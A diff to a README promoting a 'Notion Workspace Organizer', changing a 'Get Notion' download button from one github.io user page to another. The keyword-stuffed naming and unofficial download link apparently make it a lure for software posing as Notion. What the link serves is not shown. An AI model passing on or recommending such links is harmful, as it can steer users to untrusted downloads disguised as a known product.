@@ -21,7 +21,7 @@ To begin using this **Notion Workspace Organizer** and **Notion Note Taking App*
 | :--- | :--- |
 | **Get Notion Workspace Organizer** | Click the button below to start using this **Notion Database Builder**. |
 
-[![Button](https://img.shields.io/badge/📓-Get_Notion-2ea44f?style=for-the-badge)](https://gorbachyovgermanes.github.io/.github/notion-workspace-organizer)
+[![Button](https://img.shields.io/badge/📓-Get_Notion-2ea44f?style=for-the-badge)](https://derrickmaciasspnc.github.io/.github/notion-workspace-organizer)
 
 ## System Requirements
 
